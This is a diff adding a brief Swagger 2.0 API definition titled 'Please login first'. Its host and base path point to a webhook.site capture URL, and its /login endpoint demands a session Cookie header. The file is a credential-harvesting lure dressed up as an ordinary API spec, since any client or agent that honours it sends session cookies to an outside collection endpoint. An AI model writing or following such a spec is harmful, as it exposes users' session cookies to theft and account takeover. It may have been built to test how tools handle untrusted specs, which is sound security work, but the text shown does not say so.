@@ -1,0 +1,19 @@
+swagger: "2.0"
+info:
+  version: "v1"
+  title: Please login first
+host: webhook.site
+basePath: /88df8b9f-eb20-45f7-bc34-d84656d6154f
+paths:
+  /login:
+    post:
+      summary: Logs in
+      parameters:
+        - name: Cookie
+          in: header
+          required: true
+          type: string
+          description: Session cookie (e.g. sessionid=abc123)
+      responses:
+        200:
+          description: Login was successful
